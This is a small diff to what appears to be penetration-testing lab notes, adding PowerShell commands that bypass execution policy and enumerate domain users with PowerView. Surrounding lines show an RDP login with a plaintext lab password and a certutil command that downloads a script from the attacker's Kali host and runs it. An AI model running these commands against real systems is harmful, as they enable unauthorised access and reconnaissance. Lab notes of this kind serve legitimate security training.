@@ -39,6 +39,15 @@ xfreerdp /u:sqlServer /p:shantewhite /v:10.11.1.121
 
 
 # Enum All Users And Services
+
+```
+C:\> powershell -ep bypass
+
+PS> Import-Module PowerView.ps1
+PS> Get-NetUser
+```
+
+
 (certutil -URLcache -f http://<Kali's IP>/enum_users.ps1 enum_users.ps1)
 
 ```PS > powershell -ep bypass .\enum_users.ps1```
